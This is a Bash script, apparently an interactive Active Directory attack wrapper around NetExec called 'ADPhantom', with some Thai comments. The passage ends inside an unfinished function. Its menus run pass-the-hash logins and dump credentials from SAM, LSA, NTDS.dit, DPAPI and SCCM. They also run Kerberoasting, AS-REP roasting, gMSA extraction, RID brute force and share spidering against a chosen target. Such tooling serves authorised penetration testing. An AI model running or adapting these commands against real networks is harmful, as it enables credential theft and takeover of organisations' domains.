#!/bin/bash

# NetExec Interactive Script
# Version: 3.1
# Description: Interactive script to run netexec commands with complete credential gathering and enumeration options

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration file to save settings
CONFIG_FILE="$HOME/.netexec_config"

# Logging setup
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_DIR="$(cd "$(dirname "$0")" && pwd)/reports"
LOG_FILE="$LOG_DIR/session_${TIMESTAMP}.log"
REPORT_TXT="$LOG_DIR/report_${TIMESTAMP}.txt"
REPORT_HTML="$LOG_DIR/report_${TIMESTAMP}.html"
mkdir -p "$LOG_DIR"

# Write session header to log
{
    echo "SESSION_START=$(date '+%Y-%m-%d %H:%M:%S')"
    echo "HOSTNAME=$(hostname)"
    echo "USER_RUNNING=$(whoami)"
} >> "$LOG_FILE"

# Wrapper: run netexec, display output AND save to log
# Ctrl+C จะถามว่าข้ามหรือออก แทนที่จะปิดโปรแกรมทันที
nxcrun() {
    echo "" >> "$LOG_FILE"
    echo "[$(date '+%H:%M:%S')] CMD: netexec $*" >> "$LOG_FILE"

    while true; do
        _SIGINT_CAUGHT=0
        trap '_SIGINT_CAUGHT=1' INT
        netexec "$@" 2>&1 | tee -a "$LOG_FILE"
        trap - INT

        [ $_SIGINT_CAUGHT -eq 0 ] && break

        echo -e "\n\n${YELLOW}[!] Command ถูก interrupt (Ctrl+C)${NC}"
        echo -e "  ${CYAN}r${NC} = รันใหม่อีกครั้ง"
        echo -e "  ${CYAN}s / Enter${NC} = ข้าม step นี้ไป step ถัดไป"
        echo -e "  ${CYAN}q${NC} = ออกโปรแกรม (บันทึก report)"
        read -p "  เลือก: " _int_choice
        case "$_int_choice" in
            r|R) echo -e "${CYAN}[*] Retrying...${NC}" ;;
            q|Q) generate_report; echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
            *)   return 0 ;;
        esac
    done
}

# Ask user to skip a step; returns 0 if skipping, 1 if running
ask_skip() {
    local description="$1"
    echo -e "\n${CYAN}[?] Next: ${description}${NC}"
    read -p "    Press Enter to run, or type 's' to skip: " _skip_input
    [[ "$_skip_input" == "s" || "$_skip_input" == "S" ]]
}

# Log a section header
log_section() {
    {
        echo ""
        echo "════════════════════════════════════════"
        echo "  $1"
        echo "════════════════════════════════════════"
    } >> "$LOG_FILE"
}

# Function to print banner
print_banner() {
    clear
    echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     ADPhantom Ultimate Tool        ║${NC}"
    echo -e "${BLUE}║     Credential & Enumeration Master   ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    echo ""
}

# Function to get target IP
get_target() {
    if [ -f "$CONFIG_FILE" ] && [ -s "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        echo -e "${CYAN}Last used target: $TARGET${NC}"
        read -p "Use last target? (y/n): " use_last
        if [[ $use_last == "y" || $use_last == "Y" ]]; then
            return
        fi
    fi
    
    echo -e "${YELLOW}Enter target IP/Domain:${NC}"
    read -p "> " TARGET
    echo "TARGET=$TARGET" > "$CONFIG_FILE"
}

# Function to get credentials
get_credentials() {
    echo -e "${YELLOW}Do you want to use credentials? (y/n):${NC}"
    read -p "> " use_creds

    if [[ $use_creds == "y" || $use_creds == "Y" ]]; then

        # ── Username: single or file ──────────────────────────
        echo -e "\n${YELLOW}Username type:${NC}"
        echo "1) Single username"
        echo "2) From file (userlist)"
        read -p "> " user_type

        if [[ $user_type == "2" ]]; then
            while true; do
                echo -e "${YELLOW}Enter path to username file:${NC}"
                read -p "> " USERNAME_FILE
                if [ -f "$USERNAME_FILE" ]; then
                    USERNAME="[file: $USERNAME_FILE]"
                    USER_OPT="-u $USERNAME_FILE"
                    break
                else
                    echo -e "${RED}[!] File not found: $USERNAME_FILE${NC}"
                fi
            done
        else
            echo -e "${YELLOW}Enter Username:${NC}"
            read -p "> " USERNAME
            USER_OPT="-u $USERNAME"
            USERNAME_FILE=""
        fi

        # ── Auth: password or NTLM hash ───────────────────────
        echo -e "\n${YELLOW}Authentication type:${NC}"
        echo "1) Password"
        echo "2) NTLM Hash"
        read -p "> " auth_type

        if [[ $auth_type == "2" ]]; then
            echo -e "${YELLOW}Enter NTLM Hash:${NC}"
            read -s -p "> " HASH
            echo ""
            PASSWORD=""
            AUTH_CRED="-H $HASH"
        else
            echo -e "${YELLOW}Enter Password:${NC}"
            read -s -p "> " PASSWORD
            echo ""
            HASH=""
            AUTH_CRED="-p $PASSWORD"
        fi

        # ── Domain ────────────────────────────────────────────
        echo -e "${YELLOW}Enter Domain (optional, press Enter to skip):${NC}"
        read -p "> " DOMAIN
        if [ ! -z "$DOMAIN" ]; then
            DOMAIN_OPTION="-d $DOMAIN"
        else
            DOMAIN_OPTION=""
        fi

        # ── Local Auth ────────────────────────────────────────
        echo -e "${YELLOW}Use local authentication? (y/n):${NC}"
        read -p "> " use_local
        if [[ $use_local == "y" || $use_local == "Y" ]]; then
            LOCAL_AUTH="--local-auth"
        else
            LOCAL_AUTH=""
        fi

        # ── Kerberos ──────────────────────────────────────────
        echo -e "${YELLOW}Use Kerberos? (y/n):${NC}"
        read -p "> " use_kerb
        if [[ $use_kerb == "y" || $use_kerb == "Y" ]]; then
            KERBEROS="-k"
        else
            KERBEROS=""
        fi

        # Save to config
        echo "USERNAME=$USERNAME" >> "$CONFIG_FILE"
        echo "DOMAIN=$DOMAIN" >> "$CONFIG_FILE"
    else
        USERNAME="''"
        USER_OPT="-u ''"
        AUTH_CRED="-p ''"
        PASSWORD=""
        HASH=""
        DOMAIN_OPTION=""
        LOCAL_AUTH=""
        KERBEROS=""
    fi
}

# Function to show main menu
show_menu() {
    echo -e "\n${GREEN}=== Main Menu ===${NC}"
    echo -e "${CYAN}Target  : $TARGET${NC}"
    echo -e "${CYAN}Username: $USERNAME${NC}"
    echo -e "${CYAN}Auth    : ${HASH:+Hash} ${PASSWORD:+Password}${NC}"
    echo -e "${CYAN}Domain  : ${DOMAIN:-'Not set'}${NC}"
    echo ""
    echo "1) 🔐 Authentication Tests"
    echo "2) 📋 Basic Enumeration"
    echo "3) 📁 SMB Enumeration"
    echo "4) 👥 LDAP Enumeration"
    echo "5) 🗄️ MSSQL Enumeration"
    echo "6) 📂 FTP Enumeration"
    echo "7) 💀 Credential Dumping (Advanced)"
    echo "8) 🔓 Vulnerability Checking"
    echo "9) 🛠️  Useful Modules"
    echo "10) 🔑 Password Spraying"
    echo "11) 🗺️  Mapping & Enumeration (Advanced)"
    echo "12) 🎯 All-in-One (Run Everything)"
    echo "13) ⚙️  Change Target/Credentials"
    echo "14) 🔑🔐 gMSA Operations"
    echo "15) 🔍 Advanced LDAP Queries"
    echo "16) 🧪 Hash Checking (NTLM/NetNTLM)"
    echo "17) 🩸 BloodHound Collection (ZIP)"
    echo "18) 📤 Generate Hosts / Export Users"
    echo "0) ❌ Exit"
    echo ""
    read -p "Select option [0-18]: " choice
}

# Function to run authentication tests
run_auth() {
    log_section "Authentication Tests | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Authentication Tests ===${NC}"
    
    ask_skip "Null Authentication" || nxcrun smb "$TARGET" -u '' -p ''
    ask_skip "Guest Authentication" || nxcrun smb "$TARGET" -u 'guest' -p ''

    if [ "$USERNAME" != "''" ]; then
        ask_skip "Local Authentication" || nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED --local-auth
        ask_skip "SMB Signing Check (gen-relay-list)" || nxcrun smb "$TARGET" --gen-relay-list "relay_${TARGET}.txt"
    fi

    read -p "Press Enter to continue..."
}

# Function to run hash checking
run_hash_check() {
    log_section "Hash Checking | Target: $TARGET"
    echo -e "\n${GREEN}=== Hash Checking ===${NC}"
    echo -e "${YELLOW}This option allows you to test NTLM hashes against the target${NC}\n"
    
    echo "Select hash type:"
    echo "1) 🔑 NTLM Hash (Single)"
    echo "2) 🔑 NTLM Hash (From file)"
    echo "3) 📝 NetNTLMv1 (Single)"
    echo "4) 📝 NetNTLMv1 (From file)"
    echo "5) 📋 NetNTLMv2 (Single)"
    echo "6) 📋 NetNTLMv2 (From file)"
    echo "7) 🔄 Convert NetNTLM to NTLM (using --ntlm)"
    echo "8) 🔙 Back to main menu"
    read -p "Choice [1-8]: " hash_choice
    
    case $hash_choice in
        1)
            echo -e "\n${YELLOW}[*] Testing single NTLM hash${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter NTLM hash: " ntlm_hash
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" $LOCAL_AUTH $KERBEROS
            else
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" -d "$hash_domain" $KERBEROS
            fi
            ;;
        2)
            echo -e "\n${YELLOW}[*] Testing NTLM hashes from file${NC}"
            read -p "Enter path to hash file (format: username:hash or username:domain:hash): " hash_file
            if [ ! -f "$hash_file" ]; then
                echo -e "${RED}[!] File not found: $hash_file${NC}"
                read -p "Press Enter to continue..."
                return
            fi
            nxcrun smb "$TARGET" -H "$hash_file" $LOCAL_AUTH $KERBEROS
            ;;
        3)
            echo -e "\n${YELLOW}[*] Testing single NetNTLMv1 hash${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter NetNTLMv1 hash: " ntlmv1_hash
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" --ntlmv1 $LOCAL_AUTH
            else
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" -d "$hash_domain" --ntlmv1
            fi
            ;;
        4)
            echo -e "\n${YELLOW}[*] Testing NetNTLMv1 hashes from file${NC}"
            read -p "Enter path to NetNTLMv1 hash file: " hash_file
            if [ ! -f "$hash_file" ]; then
                echo -e "${RED}[!] File not found: $hash_file${NC}"
                read -p "Press Enter to continue..."
                return
            fi
            nxcrun smb "$TARGET" -H "$hash_file" --ntlmv1 $LOCAL_AUTH
            ;;
        5)
            echo -e "\n${YELLOW}[*] Testing single NetNTLMv2 hash${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter NetNTLMv2 hash: " ntlmv2_hash
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" --ntlmv2 $LOCAL_AUTH
            else
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" -d "$hash_domain" --ntlmv2
            fi
            ;;
        6)
            echo -e "\n${YELLOW}[*] Testing NetNTLMv2 hashes from file${NC}"
            read -p "Enter path to NetNTLMv2 hash file: " hash_file
            if [ ! -f "$hash_file" ]; then
                echo -e "${RED}[!] File not found: $hash_file${NC}"
                read -p "Press Enter to continue..."
                return
            fi
            nxcrun smb "$TARGET" -H "$hash_file" --ntlmv2 $LOCAL_AUTH
            ;;
        7)
            echo -e "\n${YELLOW}[*] Convert NetNTLM to NTLM (--ntlm)${NC}"
            echo -e "${CYAN}This option forces NetNTLM authentication for testing${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter password/hash: " hash_pass
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -p "$hash_pass" --ntlm
            else
                nxcrun smb "$TARGET" -u "$hash_user" -p "$hash_pass" -d "$hash_domain" --ntlm
            fi
            ;;
        8)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run basic enumeration
run_basic_enum() {
    log_section "Basic Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Basic Enumeration ===${NC}"
    
    ask_skip "Basic SMB Info" || nxcrun smb "$TARGET"
    ask_skip "List Shares" || nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
    ask_skip "List Users" || nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --users
    ask_skip "RID Brute Force" || nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute

    read -p "Press Enter to continue..."
}

# Function for advanced credential dumping
run_cred_dump_advanced() {
    log_section "Credential Dumping | Target: $TARGET"
    echo -e "\n${GREEN}=== Advanced Credential Dumping ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for credential dumping${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select credential dumping method:"
    echo "1) 💾 SAM (Security Account Manager)"
    echo "2) 🔐 LSA Secrets"
    echo "3) 🏢 NTDS.dit (Domain Controller)"
    echo "4) 🔑 DPAPI (Data Protection API)"
    echo "5) 💻 SCCM (System Center Configuration Manager)"
    echo "6) 📋 All SAM/LSA/NTDS/DPAPI"
    echo "7) 🎯 Dump specific user from NTDS"
    echo "8) 🔙 Back to main menu"
    read -p "Choice [1-8]: " dump_choice
    
    case $dump_choice in
        1)
            echo -e "\n${YELLOW}[*] SAM Dump - Select method:${NC}"
            echo "1) regdump (Registry dump)"
            echo "2) secdump (Security dump)"
            read -p "Method [1-2]: " sam_method
            if [ "$sam_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam regdump
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam secdump
            fi
            ;;
        2)
            echo -e "\n${YELLOW}[*] LSA Dump - Select method:${NC}"
            echo "1) regdump (Registry dump)"
            echo "2) secdump (Security dump)"
            read -p "Method [1-2]: " lsa_method
            if [ "$lsa_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa regdump
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa secdump
            fi
            ;;
        3)
            echo -e "\n${YELLOW}[*] NTDS Dump - Select method:${NC}"
            echo "1) drsuapi (DRS RPC protocol)"
            echo "2) vss (Volume Shadow Copy)"
            read -p "Method [1-2]: " ntds_method
            read -p "Only dump enabled targets? (y/n): " enabled_only
            enabled_flag=""
            if [[ $enabled_only == "y" || $enabled_only == "Y" ]]; then
                enabled_flag="--enabled"
            fi
            
            if [ "$ntds_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds drsuapi $enabled_flag
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds vss $enabled_flag
            fi
            ;;
        4)
            echo -e "\n${YELLOW}[*] DPAPI Dump${NC}"
            echo "Options:"
            echo "- nosystem: Don't dump SYSTEM DPAPI"
            echo "- cookies: Dump cookies"
            echo "Example: nosystem cookies (dump cookies without SYSTEM)"
            read -p "Enter DPAPI options (press Enter for default): " dpapi_opts
            
            # Check for masterkey file
            read -p "Use masterkey file? (y/n): " use_mkfile
            mkfile_opt=""
            if [[ $use_mkfile == "y" || $use_mkfile == "Y" ]]; then
                read -p "Enter masterkey file path: " mkfile
                mkfile_opt="--mkfile $mkfile"
            fi
            
            # Check for PVK file
            read -p "Use domain backupkey file? (y/n): " use_pvk
            pvk_opt=""
            if [[ $use_pvk == "y" || $use_pvk == "Y" ]]; then
                read -p "Enter PVK file path: " pvk
                pvk_opt="--pvk $pvk"
            fi
            
            if [ -z "$dpapi_opts" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $mkfile_opt $pvk_opt
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $dpapi_opts $mkfile_opt $pvk_opt
            fi
            ;;
        5)
            echo -e "\n${YELLOW}[*] SCCM Dump - Select method:${NC}"
            echo "1) disk (Disk enumeration)"
            echo "2) wmi (WMI enumeration)"
            read -p "Method [1-2]: " sccm_method
            if [ "$sccm_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm disk
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm wmi
            fi
            ;;
        6)
            echo -e "\n${YELLOW}[*] Dumping all credentials...${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam --lsa --ntds --dpapi
            ;;
        7)
            echo -e "\n${YELLOW}[*] Dump specific user from NTDS${NC}"
            read -p "Enter username to dump: " target_user
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds --user "$target_user"
            ;;
        8)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function for advanced mapping/enumeration
run_mapping_enum() {
    log_section "Advanced Mapping & Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Advanced Mapping & Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for advanced enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select enumeration type:"
    echo "1) 📁 Shares & Directories"
    echo "2) 🌐 Network Interfaces"
    echo "3) 💻 SMB Sessions"
    echo "4) 💾 Disks"
    echo "5) 👤 Logged-on Users"
    echo "6) 👥 Domain Users/Groups"
    echo "7) 🏠 Local Groups"
    echo "8) 🔐 Password Policy"
    echo "9) 🔢 RID Brute Force"
    echo "10) 🖥️ RDP Connections (qwinsta)"
    echo "11) ⚙️ Running Processes (tasklist)"
    echo "12) 📋 All-in-One Enumeration"
    echo "13) 🔙 Back to main menu"
    read -p "Choice [1-13]: " enum_choice
    
    case $enum_choice in
        1)
            echo -e "\n${YELLOW}[*] Share Enumeration${NC}"
            echo "1) List all shares"
            echo "2) List directory contents"
            echo "3) Filter shares by access"
            read -p "Choice [1-3]: " share_choice
            
            case $share_choice in
                1)
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
                    ;;
                2)
                    read -p "Enter directory path (default: root): " dir_path
                    if [ -z "$dir_path" ]; then
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir
                    else
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir "$dir_path"
                    fi
                    ;;
                3)
                    read -p "Filter by access (read/write/read,write): " filter
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --filter-shares "$filter"
                    ;;
            esac
            ;;
        2)
            echo -e "\n${YELLOW}[*] Network Interfaces:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --interfaces
            ;;
        3)
            echo -e "\n${YELLOW}[*] SMB Sessions:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --smb-sessions
            ;;
        4)
            echo -e "\n${YELLOW}[*] Disks:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --disks
            ;;
        5)
            echo -e "\n${YELLOW}[*] Logged-on Users${NC}"
            echo "1) Enumerate all logged-on users"
            echo "2) Search for specific user"
            read -p "Choice [1-2]: " user_choice
            
            if [ "$user_choice" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users
            else
                read -p "Enter username to search (regex supported): " search_user
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users-filter "$search_user"
            fi
            ;;
        6)
            echo -e "\n${YELLOW}[*] Domain Users/Groups${NC}"
            echo "1) Enumerate all domain users"
            echo "2) Export users to file"
            echo "3) Enumerate specific user"
            echo "4) Enumerate groups"
            echo "5) Enumerate computers"
            read -p "Choice [1-5]: " domain_choice
            
            case $domain_choice in
                1)
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users
                    ;;
                2)
                    read -p "Enter output filename: " export_file
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users-export "$export_file"
                    ;;
                3)
                    read -p "Enter username: " specific_user
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users "$specific_user"
                    ;;
                4)
                    read -p "Enter group name (or press Enter for all groups): " group_name
                    if [ -z "$group_name" ]; then
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --groups
                    else
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --groups "$group_name"
                    fi
                    ;;
                5)
                    read -p "Enter computer name (or press Enter for all computers): " computer_name
                    if [ -z "$computer_name" ]; then
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --computers
                    else
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --computers "$computer_name"
                    fi
                    ;;
            esac
            ;;
        7)
            echo -e "\n${YELLOW}[*] Local Groups${NC}"
            read -p "Enter local group name (or press Enter for all groups): " local_group
            if [ -z "$local_group" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups "$local_group"
            fi
            ;;
        8)
            echo -e "\n${YELLOW}[*] Password Policy:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --pass-pol
            ;;
        9)
            echo -e "\n${YELLOW}[*] RID Brute Force${NC}"
            read -p "Enter max RID (default: 4000): " max_rid
            if [ -z "$max_rid" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute "$max_rid"
            fi
            ;;
        10)
            echo -e "\n${YELLOW}[*] RDP Connections (qwinsta):${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --qwinsta
            ;;
        11)
            echo -e "\n${YELLOW}[*] Running Processes (tasklist):${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --tasklist
            ;;
        12)
            echo -e "\n${YELLOW}[*] All-in-One Enumeration:${NC}"
            ask_skip "Shares + Interfaces + Sessions + Disks" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --interfaces --smb-sessions --disks
            ask_skip "Logged-on Users + Users + Groups + Local Groups" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users --users --groups --local-groups
            ask_skip "Password Policy + RID Brute" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --pass-pol --rid-brute
            ask_skip "RDP (qwinsta) + Processes (tasklist)" || \
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --qwinsta --tasklist
            ;;
        13)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run SMB enumeration
run_smb_enum() {
    log_section "SMB Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running SMB Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for full SMB enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    ask_skip "All-in-One SMB Enumeration (groups/shares/sessions/pass-pol)" || \
        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --groups --local-groups --loggedon-users --sessions --shares --pass-pol

    if ! ask_skip "Spider_plus Module"; then
        echo -e "${CYAN}Spider_plus options (ใส่ค่าหรือกด Enter ใช้ค่า default):${NC}"

        read -p "Read-only? (Y/n): " read_only
        read -p "Max depth (default: no limit, แนะนำ 2-3 ถ้าค้าง): " sp_depth
        read -p "Max file size in KB (default: 51200 = 50MB): " sp_size
        read -p "Exclude extensions, คั่นด้วย comma (default: exe,dll,msi,iso,zip): " sp_exts
        read -p "Timeout (วินาที, default: ไม่จำกัด, แนะนำ 300): " sp_timeout

        sp_opts="READ_ONLY=true"
        [[ "$read_only" == "n" || "$read_only" == "N" ]] && sp_opts="READ_ONLY=false"
        [ -n "$sp_depth" ]   && sp_opts="$sp_opts DEPTH=$sp_depth"
        [ -n "$sp_size" ]    && sp_opts="$sp_opts MAX_FILE_SIZE=$(( sp_size * 1024 ))"
        [ -n "$sp_exts" ]    && sp_opts="$sp_opts EXCLUDE_EXTENSIONS=$sp_exts"
        [ -z "$sp_exts" ]    && sp_opts="$sp_opts EXCLUDE_EXTENSIONS=exe,dll,msi,iso,zip"

        if [ -n "$sp_timeout" ]; then
            timeout "$sp_timeout" bash -c \
                "netexec smb \"$TARGET\" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus -o $sp_opts 2>&1 | tee -a \"$LOG_FILE\""
            [ $? -eq 124 ] && echo -e "\n${YELLOW}[!] Spider_plus หมดเวลา ($sp_timeout วินาที) — ผลที่ได้อาจไม่ครบ${NC}"
        else
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus -o $sp_opts
        fi
    fi

    read -p "Press Enter to continue..."
}

# Function to run LDAP enumeration
run_ldap_enum() {
    log_section "LDAP Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running LDAP Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "\n${YELLOW}[*] LDAP User Enumeration (Null):${NC}"
        nxcrun ldap "$TARGET" -u '' -p '' --users
        read -p "Press Enter to continue..."
        return
    fi
    
    ask_skip "LDAP All-in-One (trusted-delegation/password-not-required/admin-count/users/groups)" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --trusted-for-delegation --password-not-required --admin-count --users --groups

    ask_skip "Find Delegation Relationships" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --find-delegation

    ask_skip "Kerberoasting" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --kerberoasting "kerberoast_${TARGET}.txt"

    ask_skip "ASREProast" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --asreproast "asreproast_${TARGET}.txt"

    ask_skip "ADCS Enumeration" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS -M adcs

    ask_skip "MachineAccountQuota" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS -M maq

    ask_skip "gMSA (Group Managed Service Accounts)" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa

    read -p "Press Enter to continue..."
}

# Auto tombstone — รันทุก type โดยไม่มีเมนู (ใช้ใน All-in-One)
run_tombstone_auto() {
    local ts_attrs="sAMAccountName,distinguishedName,lastKnownParent,whenChanged,isDeleted"
    log_section "Tombstone (Deleted Objects) | Target: $TARGET"

    ask_skip "Tombstone — Deleted Users" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
            --query "(&(isDeleted=TRUE)(objectClass=user))" "$ts_attrs" --tombstone

    ask_skip "Tombstone — Deleted Computers" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
            --query "(&(isDeleted=TRUE)(objectClass=computer))" "$ts_attrs" --tombstone

    ask_skip "Tombstone — Deleted Groups" || \
        nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS \
            --query "(&(isDeleted=TRUE)(objectClass=group))" "$ts_attrs" --tombstone
}

# Function to query tombstone (deleted AD objects) — interactive menu
run_tombstone() {
